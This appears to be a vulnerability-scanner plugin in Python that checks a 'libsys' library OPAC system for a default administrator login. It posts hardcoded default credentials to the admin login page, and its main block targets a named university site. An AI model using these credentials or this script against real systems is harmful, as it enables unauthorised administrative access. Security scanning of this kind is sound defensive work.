#! /usr/bin/env python
# -*- coding: utf-8 -*-
#author:    oneroy@qq.com

import re

def assign(service, arg):
    if service == "libsys":
        return True, arg

def audit(arg):
    payload = "admin/login.php"
    url = arg + payload
    postpayload = 'username=opac_admin&passwd=huiwen_opac'
    code, head, res, errcode, _  = curl.curl2(url,postpayload)
    if code == 302 and  "cfg_basic.php" in head:
        security_warning(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('libsys','http://libopac.fjnu.edu.cn/')[1])